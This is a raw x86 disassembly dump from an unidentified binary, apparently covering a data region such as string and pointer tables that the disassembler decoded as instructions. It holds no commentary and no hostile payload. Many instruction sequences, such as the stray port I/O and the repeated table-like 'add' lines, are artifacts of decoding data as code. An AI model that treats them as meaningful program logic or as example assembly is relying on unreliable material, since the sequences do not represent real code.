  427e35:	xor    al,0x2c
  427e37:	add    ah,dl
  427e39:	xor    al,0x2c
  427e3b:	add    ah,dl
  427e3d:	xor    al,0x2c
  427e3f:	int    0x74
  427e41:	xor    al,0x54
  427e43:	add    cl,dh
  427e45:	in     al,dx
  427e46:	cmp    BYTE PTR [eax],al
  427e48:	aam    0x34
  427e4a:	and    al,0x0
  427e4c:	aam    0x34
  427e4e:	and    al,0x0
  427e50:	aam    0x34
  427e52:	and    al,0xcd
  427e54:	je     0x427e8a
  427e56:	push   eax
  427e57:	add    cl,dh
  427e59:	in     al,dx
  427e5a:	and    al,BYTE PTR [eax]
  427e5c:	aam    0x34
  427e5e:	adc    al,0xcd
  427e60:	je     0x427e96
  427e62:	cmp    al,0x0
  427e64:	icebp  
  427e65:	in     al,dx
  427e66:	xchg   ch,cl
  427e68:	je     0x427e9e
  427e6a:	xor    al,0x0
  427e6c:	icebp  
  427e6d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e71:	int    0x74
  427e73:	xor    al,0x4c
  427e75:	push   es
  427e76:	ins    DWORD PTR es:[edi],dx
  427e77:	aam    0x4e
  427e79:	int    0x74
  427e7b:	xor    al,0x84
  427e7d:	leave  
  427e7e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e84:	and    DWORD PTR [esi+0x3474cd35],eax
  427e8a:	mov    ch,cl
  427e8c:	mov    WORD PTR [esp+eax*4],?
  427e8f:	int    0xa
  427e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e92:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e9c:	and    DWORD PTR [esi+0x3474cd35],eax
  427ea2:	mov    ch,cl
  427ea4:	mov    WORD PTR [eax+ecx*4],?
  427ea7:	cmp    edi,DWORD PTR [ecx+0x4]
  427eaa:	add    bh,bh
  427eac:	shl    edx,cl
  427eae:	sub    bl,dl
  427eb0:	mov    ebp,0xcdd35392
  427eb5:	mov    WORD PTR [esp+ecx*2],?
  427eb8:	inc    ebx
  427eb9:	rcl    esi,cl
  427ebb:	and    ecx,ebp
  427ebd:	je     0x427ef3
  427ebf:	test   ch,cl
  427ec1:	mov    WORD PTR [esp+eax*4],?
  427ec4:	int    0xa
  427ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ec7:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427ed1:	add    BYTE PTR [eax],0x70
  427ed4:	cmp    al,0xec
  427ed6:	push   ds
  427ed7:	iret   
  427ed8:	jbe    0x427e5e
  427eda:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427ede:	int    0x74
  427ee0:	xor    al,0x4c
  427ee2:	int    0x8c
  427ee4:	xor    al,0x84
  427ee6:	int    0xa
  427ee8:	in     al,0x81
  427eea:	add    BYTE PTR [eax-0x777e7633],0xcd
  427ef1:	je     0x427f27
  427ef3:	test   ch,cl
  427ef5:	add    ebp,ebp
  427ef7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427f01:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427f07:	or     bh,0x84
  427f0a:	adc    cl,ch
  427f0c:	mov    WORD PTR [esp+eax*4],?
  427f0f:	int    0xa
  427f11:	in     al,0x81
  427f13:	add    BYTE PTR [eax-0x76327f33],0x81
  427f1a:	mov    BYTE PTR [eax-0x2d591833],ch
  427f20:	sub    al,0x80
  427f22:	lds    edx,FWORD PTR [eax+0x75]
  427f25:	ins    BYTE PTR es:[edi],dx
  427f26:	jae    0x427f9f
  427f28:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427f2c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427f30:	add    BYTE PTR [ecx+0x74],ah
  427f33:	ins    BYTE PTR es:[edi],dx
  427f34:	popa   
  427f35:	inc    esp
  427f36:	gs popa 
  427f38:	fs push 0x6561686d
  427f3e:	add    BYTE PTR fs:[ebp+0x74],ah
  427f42:	push   0x65726143
  427f47:	outs   dx,DWORD PTR ds:[esi]
  427f48:	jns    0x427fb0
  427f4a:	add    BYTE PTR gs:[edi+0x72],dh
  427f4e:	jns    0x427fbd
  427f50:	popa   
  427f51:	outs   dx,DWORD PTR ds:[esi]
  427f52:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f56:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f5a:	push   0x6f6d6568
  427f5f:	add    BYTE PTR fs:[edx+0x65],dl
  427f63:	arpl   WORD PTR [ebx+0x62],si
  427f66:	popa   
  427f67:	ins    BYTE PTR es:[edi],dx
  427f68:	jne    0x427fe2
  427f6a:	gs jae 0x427f6d
  427f6d:	ins    DWORD PTR es:[edi],dx
  427f6e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f75:	outs   dx,DWORD PTR ds:[esi]
  427f76:	jb     0x427fe7
  427f78:	jo     0x427f7a
  427f7a:	ja     0x427fdd
  427f7c:	gs je  0x427fee
  427f7f:	jb     0x427ff0
  427f81:	bound  esp,QWORD PTR [ecx+0x70]
  427f84:	add    BYTE PTR [ebx+0x69],cl
  427f87:	outs   dx,BYTE PTR ds:[esi]
  427f88:	addr16 addr16 popa 
  427f8b:	outs   dx,BYTE PTR ds:[esi]
  427f8c:	arpl   WORD PTR [ecx+0x70],sp
  427f8f:	add    BYTE PTR [edi+0x6e],al
  427f92:	jne    0x428007
  427f94:	je     0x427ffb
  427f96:	outs   dx,BYTE PTR ds:[esi]
  427f97:	push   esi
  427f98:	popa   
  427f99:	jb     0x428014
  427f9b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f9f:	jb     0x427ff1
  427fa1:	popa   
  427fa2:	ins    BYTE PTR es:[edi],dx
  427fa3:	ins    DWORD PTR es:[edi],dx
  427fa4:	je     0x42800f
  427fa6:	outs   dx,DWORD PTR ds:[esi]
  427fa7:	ja     0x42800e
  427fa9:	jb     0x427fab
  427fab:	jo     0x428012
  427fad:	ins    DWORD PTR es:[edi],dx
  427fae:	jns    0x428024
  427fb0:	push   0x6f656562
  427fb5:	outs   dx,BYTE PTR ds:[esi]
  427fb6:	push   eax
  427fb7:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427fbe:	inc    ebx
  427fbf:	outs   dx,DWORD PTR ds:[esi]
  427fc0:	popa   
  427fc1:	ins    BYTE PTR es:[edi],dx
  427fc2:	popa   
  427fc3:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427fca:	je     0x428045
  427fcc:	outs   dx,DWORD PTR gs:[esi]
  427fce:	outs   dx,BYTE PTR ds:[esi]
  427fcf:	gs ins BYTE PTR es:[edi],dx
  427fd1:	inc    ebx
  427fd2:	push   0x54007261
  427fd7:	jns    0x428049
  427fd9:	jns    0x428048
  427fdb:	jne    0x428042
  427fdd:	imul   eax,DWORD PTR gs:[eax],0x70
  427fe1:	outs   dx,DWORD PTR ds:[esi]
  427fe2:	je     0x428026
  427fe4:	gs gs jb 0x428058
  427fe8:	outs   dx,DWORD PTR ds:[esi]
  427fe9:	je     0x428056
  427feb:	imul   eax,DWORD PTR [eax],0x616c7548
  427ff1:	jo     0x42805c
  427ff3:	popa   
  427ff4:	ins    BYTE PTR es:[edi],dx
  427ff5:	dec    ebx
  427ff6:	outs   dx,BYTE PTR ds:[esi]
  427ff7:	popa   
  427ff8:	jo     0x428073
  427ffa:	add    BYTE PTR gs:[eax+0x6f],dh
  427ffe:	je     0x428042
  428000:	gs ins BYTE PTR es:[edi],dx
  428002:	jae    0x428073
  428004:	js     0x428006
  428006:	popa   
  428007:	data16 je 0x428050
  42800a:	ins    BYTE PTR es:[edi],dx
  42800b:	popa   
  42800c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  428010:	gs jae 0x428074
  428013:	jb     0x428015
  428015:	inc    edx
  428016:	ins    BYTE PTR es:[edi],dx
  428017:	popa   
  428018:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  42801c:	je     0x428084
  42801e:	ins    BYTE PTR es:[edi],dx
  42801f:	jns    0x428096
  428021:	push   0x6d6d6800
  428026:	popa   
  428027:	inc    edi
  428028:	popa   
  428029:	ins    BYTE PTR es:[edi],dx
  42802a:	ins    BYTE PTR es:[edi],dx
  42802b:	push   0x48007361
  428030:	outs   dx,DWORD PTR ds:[esi]
  428031:	ins    DWORD PTR es:[edi],dx
  428032:	outs   dx,DWORD PTR gs:[esi]
  428034:	jb     0x42809b
  428036:	data16 jno 0x4280a2
  428039:	jae    0x42809c
  42803b:	bound  esi,QWORD PTR [eax+0x61]
  42803e:	add    BYTE PTR [ebp+0x74],ah
  428041:	outs   dx,BYTE PTR ds:[esi]
  428042:	gs addr16 jbe 0x4280a7
  428046:	je     0x4280c1
  428048:	gs popa 
  42804a:	add    BYTE PTR [ebp+0x67],ah
  42804d:	outs   dx,DWORD PTR ds:[esi]
  42804e:	inc    edi
  42804f:	popa   
  428050:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428058:	jo     0x4280bf
  42805a:	fs jbe 0x4280be
  42805d:	je     0x4280d4
  42805f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428063:	outs   dx,DWORD PTR ds:[esi]
  428064:	add    BYTE PTR [edx+0x0],ch
  428067:	jne    0x428069
  428069:	add    BYTE PTR [bp+0x0],ch
  42806d:	popa   
  42806e:	add    BYTE PTR [esi+0x0],ch
  428071:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428076:	add    BYTE PTR [ebp+0x0],dh
  428079:	ins    DWORD PTR es:[edi],dx
  42807a:	add    BYTE PTR [eax],al
  42807c:	add    BYTE PTR [edi+0x0],ch
  42807f:	jb     0x428081
  428081:	ja     0x428083
  428083:	imul   eax,DWORD PTR [eax],0x680073
  428089:	outs   dx,BYTE PTR ds:[esi]
  42808a:	add    BYTE PTR [ecx+0x0],ch
  42808d:	add    BYTE PTR fs:[ecx+0x0],ch
  428091:	ja     0x428093
  428093:	imul   eax,DWORD PTR [eax],0x65006e
  428099:	push   0x70000000
  42809e:	add    BYTE PTR [ecx+0x0],ah
  4280a1:	je     0x4280a3
  4280a3:	jbe    0x4280a5
  4280a5:	add    BYTE PTR gs:[ebp+0x0],ah
  4280a9:	je     0x4280ab
  4280ab:	add    BYTE PTR gs:[edi+0x0],ah
  4280af:	ins    BYTE PTR es:[edi],dx
  4280b0:	add    BYTE PTR [ecx+0x0],ah
  4280b3:	imul   eax,DWORD PTR [eax],0x66
  4280b9:	outs   dx,DWORD PTR ds:[esi]
  4280ba:	add    BYTE PTR [esi+0x0],ch
  4280bd:	je     0x4280bf
  4280bf:	popa   
  4280c0:	add    BYTE PTR [edi+0x0],dh
  4280c3:	push   ebx
  4280c4:	add    BYTE PTR [edi+0x0],ch
  4280c7:	arpl   WORD PTR [eax],ax
  4280c9:	imul   eax,DWORD PTR [eax],0x61
  4280cc:	add    BYTE PTR [esi+0x0],dh
  4280cf:	outs   dx,DWORD PTR ds:[esi]
  4280d0:	add    BYTE PTR [eax],al
  4280d2:	add    BYTE PTR [ebp+0x0],ch
  4280d5:	jns    0x4280d7
  4280d7:	add    BYTE PTR gs:[esi+0x0],ah
  4280db:	ins    BYTE PTR es:[edi],dx
  4280dc:	add    BYTE PTR [ecx+0x0],ah
  4280df:	jns    0x4280e1
  4280e1:	jbe    0x4280e3
  4280e3:	popa   
  4280e4:	add    BYTE PTR [esi+0x0],ch
  4280e7:	popa   
  4280e8:	add    BYTE PTR [edi+0x0],ah
  4280eb:	outs   dx,DWORD PTR ds:[esi]
  4280ec:	add    BYTE PTR [eax],al
  4280ee:	add    BYTE PTR [edi+0x0],ch
  4280f1:	jb     0x4280f3
  4280f3:	jae    0x4280f5
  4280f5:	imul   eax,DWORD PTR [eax],0x47006e
  4280fb:	imul   eax,DWORD PTR [eax],0x70006d
  428101:	bound  eax,QWORD PTR [eax]
  428103:	outs   dx,DWORD PTR ds:[esi]
  428104:	add    BYTE PTR [eax+0x0],dh
  428107:	imul   eax,DWORD PTR [eax],0x650000
  42810d:	js     0x42810f
  42810f:	jae    0x428111
  428111:	outs   dx,DWORD PTR ds:[esi]
  428112:	add    BYTE PTR [ebx+0x0],dh
  428115:	popa   
  428116:	add    BYTE PTR [esi+0x0],ch
  428119:	je     0x42811b
  42811b:	add    BYTE PTR [eax],al
  42811d:	bound  eax,QWORD PTR [eax]
  42811f:	jns    0x428121
  428121:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428126:	add    BYTE PTR [eax+eax*1+0x74],ah
  42812a:	add    BYTE PTR [ecx+0x0],ah
  42812d:	add    BYTE PTR [eax],al
  42812f:	js     0x428131
  428131:	imul   eax,DWORD PTR [eax],0x610054
  428137:	imul   eax,DWORD PTR [eax],0x48006e
  42813d:	popa   
  42813e:	add    BYTE PTR [esi+0x0],ch
  428141:	add    BYTE PTR fs:[eax],al
  428144:	add    BYTE PTR [edi+0x0],cl
  428147:	ja     0x428149
  428149:	ins    BYTE PTR es:[edi],dx
  42814a:	add    BYTE PTR [ebx+0x0],dh
  42814d:	popa   
  42814e:	add    BYTE PTR [ebx+0x0],dh
  428151:	jo     0x428153
  428153:	popa   
  428154:	add    BYTE PTR [ecx+0x0],ch
  428157:	imul   eax,DWORD PTR [eax],0x72
  42815a:	add    BYTE PTR [ebp+0x0],ah
  42815d:	jbe    0x42815f
  42815f:	add    BYTE PTR [eax],al
  428161:	jb     0x428163
  428163:	jne    0x428165
  428165:	je     0x428167
  428167:	ins    DWORD PTR es:[edi],dx
  428168:	add    BYTE PTR [ebp+0x0],dh
  42816b:	arpl   WORD PTR [eax],ax
  42816d:	jne    0x42816f
  42816f:	jo     0x428171
  428171:	add    BYTE PTR [eax],al
  428173:	jae    0x428175
  428175:	outs   dx,DWORD PTR ds:[esi]
  428176:	add    BYTE PTR [esi+0x0],ah
  428179:	imul   eax,DWORD PTR [eax],0x630062
  42817f:	outs   dx,DWORD PTR ds:[esi]
  428180:	add    BYTE PTR [ecx+0x0],ch
  428183:	jb     0x428185
  428185:	jae    0x428187
  428187:	outs   dx,DWORD PTR ds:[esi]
  428188:	add    BYTE PTR [eax],al
  42818a:	add    BYTE PTR [ebx+0x0],dl
  42818d:	outs   dx,DWORD PTR ds:[esi]
  42818e:	add    BYTE PTR [ebx+0x0],ah
  428191:	popa   
  428192:	add    BYTE PTR [ecx+0x0],ch
  428195:	jae    0x428197
  428197:	data16 add BYTE PTR [ecx+0x0],ah
  42819b:	jb     0x42819d
  42819d:	popa   
  42819e:	add    BYTE PTR [ecx+0x0],ch
  4281a1:	add    BYTE PTR [eax],al
  4281a3:	add    BYTE PTR [esi],cl
  4281a5:	adc    BYTE PTR [eax],al
  4281a7:	out    0x67,eax
  4281a9:	adc    BYTE PTR [eax],al
  4281ab:	js     0x4281d4
  4281ad:	adc    BYTE PTR [eax],al
  4281af:	test   al,0x13
  4281b1:	adc    BYTE PTR [eax],al
  4281b3:	fs push esi
  4281b5:	adc    BYTE PTR [eax],al
  4281b7:	jp     0x4281d9
  4281b9:	adc    BYTE PTR [eax],al
  4281bb:	enter  0x1052,0x0
  4281bf:	loop   0x428234
  4281c1:	adc    BYTE PTR [eax],al
  4281c3:	ja     0x428230
  4281c5:	adc    BYTE PTR [eax],al
  4281c7:	cmp    al,0x2b
  4281c9:	adc    BYTE PTR [eax],al
  4281cb:	rcl    BYTE PTR [edx],1
  4281cd:	adc    BYTE PTR [eax],al
  4281cf:	sbb    DWORD PTR [eax+0x10],ebx
  4281d2:	add    BYTE PTR [esi],ah
  4281d4:	add    dl,BYTE PTR [eax]
  4281d6:	add    BYTE PTR [edi+0xc],dh
  4281d9:	adc    BYTE PTR [eax],al
  4281db:	mov    dh,BYTE PTR [ecx]
  4281dd:	adc    BYTE PTR [eax],al
  4281df:	out    dx,al
  4281e0:	sbb    eax,0xed80010
  4281e5:	adc    BYTE PTR [eax],al
  4281e7:	add    eax,0x3300107f
  4281ec:	jbe    0x4281fe
  4281ee:	add    BYTE PTR [ebx-0x58ffbd7f],ah
  4281f4:	add    DWORD PTR [edx+0x0],0x4281ab
  4281fb:	scas   eax,DWORD PTR es:[edi]
  4281fc:	add    DWORD PTR [edx+0x0],0x4281b3
  428203:	mov    bh,0x81
  428205:	inc    edx
  428206:	add    BYTE PTR [ebx-0x40ffbd7f],bh
  42820c:	add    DWORD PTR [edx+0x0],0x4281c3
  428213:	mov    DWORD PTR [ecx-0x7e34ffbe],0x81cf0042
  42821d:	inc    edx
  42821e:	add    bl,dl
  428220:	add    DWORD PTR [edx+0x0],0x4281d7
  428227:	fild   DWORD PTR [ecx-0x7e20ffbe]
  42822d:	inc    edx
  42822e:	add    bl,ah
  428230:	add    DWORD PTR [edx+0x0],0x4281e7
  428237:	jmp    0x4281ba
  428239:	inc    edx
  42823a:	add    BYTE PTR [ebx-0x7e],bh
  42823d:	inc    edx
  42823e:	add    BYTE PTR [edi-0x7e],bh
  428241:	inc    edx
  428242:	add    BYTE PTR [ebx-0x78ffbd7e],al
  428248:	add    BYTE PTR [edx+0x0],0x8b
  42824c:	add    BYTE PTR [edx+0x0],0x8f
  428250:	add    BYTE PTR [edx+0x0],0x93
  428254:	add    BYTE PTR [edx+0x0],0x97
  428258:	add    BYTE PTR [edx+0x0],0x9b
  42825c:	add    BYTE PTR [edx+0x0],0x9f
  428260:	add    BYTE PTR [edx+0x0],0xa3
  428264:	add    BYTE PTR [edx+0x0],0xa7
  428268:	add    BYTE PTR [edx+0x0],0xab
  42826c:	add    BYTE PTR [edx+0x0],0xaf
  428270:	add    BYTE PTR [edx+0x0],0xb3
  428274:	add    BYTE PTR [edx+0x0],0xb7
  428278:	add    BYTE PTR [edx+0x0],0x29
  42827c:	or     al,0x10
  42827e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428284:	push   edi
  428285:	adc    BYTE PTR [eax],al
  428287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428288:	outs   dx,DWORD PTR ds:[esi]
  428289:	adc    BYTE PTR [eax],al
  42828b:	push   ebx
  42828c:	popa   
  42828d:	adc    BYTE PTR [eax],al
  42828f:	add    dh,BYTE PTR [ebp+0x10]
  428292:	add    dh,cl
  428294:	jle    0x4282a6
  428296:	add    BYTE PTR [esi+edx*2],dl
  428299:	adc    BYTE PTR [eax],al
  42829b:	mov    al,0x68
  42829d:	adc    BYTE PTR [eax],al
  42829f:	aas    
  4282a0:	inc    esp
  4282a1:	adc    BYTE PTR [eax],al
  4282a3:	pop    ebp
  4282a4:	and    DWORD PTR [eax],edx
  4282a6:	add    bl,dl
  4282a8:	jl     0x4282ba
  4282aa:	add    BYTE PTR [edx+0xb],dh
  4282ad:	adc    BYTE PTR [eax],al
  4282af:	inc    edx
  4282b0:	push   eax
  4282b1:	adc    BYTE PTR [eax],al
  4282b3:	mov    ebp,0xbb001074
  4282b8:	pop    ds
  4282b9:	adc    BYTE PTR [eax],al
  4282bb:	sub    DWORD PTR [eax+0x10],eax
  4282be:	add    BYTE PTR [ecx],dh
  4282c0:	ja     0x4282d2
  4282c2:	add    bl,dl
  4282c4:	sbb    dl,BYTE PTR [eax]
  4282c6:	add    BYTE PTR [esi+0x1e],ch
  4282c9:	adc    BYTE PTR [eax],al
  4282cb:	or     ch,BYTE PTR [esi]
  4282cd:	adc    BYTE PTR [eax],al
  4282cf:	sbb    eax,0xa100103e
  4282d4:	data16 adc BYTE PTR [eax],al
  4282d7:	xchg   ecx,eax
  4282d8:	bound  edx,QWORD PTR [eax]
  4282da:	add    BYTE PTR [esi],bh
  4282dc:	dec    edi
  4282dd:	adc    BYTE PTR [eax],al
  4282df:	in     eax,dx
  4282e0:	adc    BYTE PTR fs:[eax],al
  4282e3:	sub    bl,BYTE PTR [ecx+0x10]
  4282e6:	add    BYTE PTR [esi+0x43],al
  4282e9:	adc    BYTE PTR [eax],al
  4282eb:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282ef:	rol    BYTE PTR [esi+0x10],0x0
  4282f3:	in     eax,0x31
  4282f5:	adc    BYTE PTR [eax],al
  4282f7:	mov    esp,0xbb00104f
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xeb
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xe1
  42833c:	and    dl,BYTE PTR [eax]
  42833e:	add    bh,bh
  428340:	push   ecx
  428341:	adc    BYTE PTR [eax],al
  428343:	test   BYTE PTR ds:0x1d0c0010,0x10
  42834a:	add    BYTE PTR [ebx],al
  42834c:	sbb    dl,BYTE PTR [eax]
  42834e:	add    ch,ah
  428350:	or     dl,BYTE PTR [eax]
  428352:	add    BYTE PTR [edi+0x42001035],bl
  428358:	pop    edi
  428359:	adc    BYTE PTR [eax],al
  42835b:	adc    eax,0xd300103f
  428360:	cmp    dl,BYTE PTR [eax]
  428362:	add    BYTE PTR [ebp+0x1001021],ah
  428368:	sbb    al,0x10
  42836a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428370:	adc    BYTE PTR cs:[eax],al
  428373:	push   eax
  428374:	adc    BYTE PTR [bx+si],al
  428377:	mov    edi,0x3b00102d
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0x6b
  4283ac:	add    DWORD PTR [edx+0x0],0x6f
  4283b0:	add    DWORD PTR [edx+0x0],0x73
  4283b4:	add    DWORD PTR [edx+0x0],0x77
  4283b8:	add    DWORD PTR [edx+0x0],0xffffff98
  4283bc:	pusha  
  4283bd:	adc    BYTE PTR [eax],al
  4283bf:	pop    ebp
  4283c0:	js     0x4283d2
  4283c2:	add    BYTE PTR [esi],bh
  4283c4:	dec    eax
  4283c5:	adc    BYTE PTR [eax],al
  4283c7:	cmp    al,0x7a
  4283c9:	adc    BYTE PTR [eax],al
  4283cb:	aam    0x9
  4283cd:	adc    BYTE PTR [eax],al
  4283cf:	or     cl,BYTE PTR [ebx]
  4283d1:	adc    BYTE PTR [eax],al
  4283d3:	pop    ebx
  4283d4:	push   ebp
  4283d5:	adc    BYTE PTR [eax],al
  4283d7:	mov    esi,0x6001032
  4283dc:	xor    edx,DWORD PTR [eax]
  4283de:	add    BYTE PTR [esi-0x16ffefc0],al
  4283e4:	and    eax,0x61460010
  4283e9:	adc    BYTE PTR [eax],al
  4283eb:	adc    DWORD PTR [ebp+0x10],ebp
  4283ee:	add    al,al
  4283f0:	dec    esi
  4283f1:	adc    BYTE PTR [eax],al
  4283f3:	jae    0x428413
  4283f5:	adc    BYTE PTR [eax],al
  4283f7:	dec    ebx
  4283f8:	add    eax,0x83bb0010
  4283fd:	inc    edx
  4283fe:	add    BYTE PTR [edi-0x3cffbd7d],bh
  428404:	add    DWORD PTR [edx+0x0],0xffffffc7
  428408:	add    DWORD PTR [edx+0x0],0xffffffcb
  42840c:	add    DWORD PTR [edx+0x0],0xffffffcf
  428410:	add    DWORD PTR [edx+0x0],0xffffffd3
  428414:	add    DWORD PTR [edx+0x0],0xffffffd7
  428418:	add    DWORD PTR [edx+0x0],0xffffffdb
  42841c:	add    DWORD PTR [edx+0x0],0xffffffdf
  428420:	add    DWORD PTR [edx+0x0],0xffffffe3
  428424:	add    DWORD PTR [edx+0x0],0xffffffe7
  428428:	add    DWORD PTR [edx+0x0],0xffffffeb
  42842c:	add    DWORD PTR [edx+0x0],0xffffffef
  428430:	add    DWORD PTR [edx+0x0],0xfffffff3
  428434:	add    DWORD PTR [edx+0x0],0xfffffff7
  428438:	add    DWORD PTR [edx+0x0],0x0
	...
  428444:	cmp    dh,BYTE PTR [ecx+0x52]
  428447:	dec    edi
  428448:	add    BYTE PTR [eax],al
  42844a:	add    BYTE PTR [eax],al
  42844c:	mov    al,ds:0x100028d
  428451:	add    BYTE PTR [eax],al
  428453:	add    BYTE PTR [ecx],al
  428455:	add    BYTE PTR [eax],al
  428457:	add    BYTE PTR [ecx],al
  428459:	add    BYTE PTR [eax],al
  42845b:	add    BYTE PTR [eax-0x73],dh
  42845e:	add    al,BYTE PTR [eax]
  428460:	nop
  428461:	lea    eax,[edx]
  428463:	add    BYTE PTR [eax+0x28d],al
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [eax],bh
  428475:	xchg   BYTE PTR [edx],al
  428477:	add    BYTE PTR [esi+eax*4+0x2],dl
  42847b:	add    BYTE PTR [esi-0x7a],ah
  42847e:	add    al,BYTE PTR [eax]
  428480:	js     0x428408
  428482:	add    al,BYTE PTR [eax]
  428484:	nop
  428485:	xchg   BYTE PTR [edx],al
  428487:	add    BYTE PTR [esi+eax*4-0x7941fffe],ah
  42848e:	add    al,BYTE PTR [eax]
  428490:	add    BYTE PTR [eax],al
  428492:	add    BYTE PTR [eax],al
  428494:	loopne 0x42841c
  428496:	add    al,BYTE PTR [eax]
  428498:	inc    BYTE PTR [esi-0x78f3fffe]
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	sbb    al,BYTE PTR [edi-0x78d1fffe]
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	cmp    al,0x87
  4284aa:	add    al,BYTE PTR [eax]
  4284ac:	dec    esi
  4284ad:	xchg   DWORD PTR [edx],eax
  4284af:	add    BYTE PTR [eax-0x79],ah
  4284b2:	add    al,BYTE PTR [eax]
  4284b4:	outs   dx,BYTE PTR ds:[esi]
  4284b5:	xchg   DWORD PTR [edx],eax
  4284b7:	add    BYTE PTR [eax-0x6dfffd79],al
  4284bd:	xchg   DWORD PTR [edx],eax
  4284bf:	add    BYTE PTR [eax-0x51fffd79],ah
  4284c5:	xchg   DWORD PTR [edx],eax
  4284c7:	add    al,al
  4284c9:	xchg   DWORD PTR [edx],eax
  4284cb:	add    ah,cl
  4284cd:	xchg   DWORD PTR [edx],eax
  4284cf:	add    dl,ah
  4284d1:	xchg   DWORD PTR [edx],eax
  4284d3:	add    ah,dh
  4284d5:	xchg   DWORD PTR [edx],eax
  4284d7:	add    BYTE PTR [esi],al
  4284d9:	mov    BYTE PTR [edx],al
  4284db:	add    BYTE PTR [edx],dl
  4284dd:	mov    BYTE PTR [edx],al
  4284df:	add    BYTE PTR [edx],ah
  4284e1:	mov    BYTE PTR [edx],al
  4284e3:	add    BYTE PTR [edx],dh
  4284e5:	mov    BYTE PTR [edx],al
  4284e7:	add    BYTE PTR [eax-0x78],cl
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	push   esp
  4284ed:	mov    BYTE PTR [edx],al
  4284ef:	add    BYTE PTR [esi-0x78],ah
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	jl     0x42847e
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	mov    cs,WORD PTR [eax-0x7763fffe]
  4284fe:	add    al,BYTE PTR [eax]
  428500:	lods   al,BYTE PTR ds:[esi]
  428501:	mov    BYTE PTR [edx],al
  428503:	add    BYTE PTR [esi-0x2dfffd78],bh
  428509:	mov    BYTE PTR [edx],al
  42850b:	add    al,ch
  42850d:	mov    BYTE PTR [edx],al
  42850f:	add    dl,bh
  428511:	mov    BYTE PTR [edx],al
  428513:	add    BYTE PTR [ecx+ecx*4],cl
  428516:	add    al,BYTE PTR [eax]
  428518:	sbb    al,0x89
  42851a:	add    al,BYTE PTR [eax]
  42851c:	sub    al,0x89
  42851e:	add    al,BYTE PTR [eax]
  428520:	cmp    al,0x89
  428522:	add    al,BYTE PTR [eax]
  428524:	dec    esi
  428525:	mov    DWORD PTR [edx],eax
  428527:	add    BYTE PTR [ecx+ecx*4+0x2],bl
  42852b:	add    BYTE PTR [edx-0x77],ch
  42852e:	add    al,BYTE PTR [eax]
  428530:	or     BYTE PTR [ecx-0x766bfffe],0x2
  428537:	add    BYTE PTR [esi-0x4dfffd77],ah
  42853d:	mov    DWORD PTR [edx],eax
  42853f:	add    BYTE PTR [esi-0x35fffd77],bh
  428545:	mov    DWORD PTR [edx],eax
  428547:	add    dl,bl
  428549:	mov    DWORD PTR [edx],eax
  42854b:	add    al,dh
  42854d:	mov    DWORD PTR [edx],eax
  42854f:	add    dh,bh
  428551:	mov    DWORD PTR [edx],eax
  428553:	add    BYTE PTR [eax],dl
  428555:	mov    al,BYTE PTR [edx]
  428557:	add    BYTE PTR [edx],ah
  428559:	mov    al,BYTE PTR [edx]
  42855b:	add    BYTE PTR [eax],al
  42855d:	add    BYTE PTR [eax],al
  42855f:	add    BYTE PTR [edx+ecx*4],bh
  428562:	add    al,BYTE PTR [eax]
  428564:	add    BYTE PTR [eax],al
  428566:	add    BYTE PTR [eax],al
  428568:	pop    edx
  428569:	mov    al,BYTE PTR [edx]
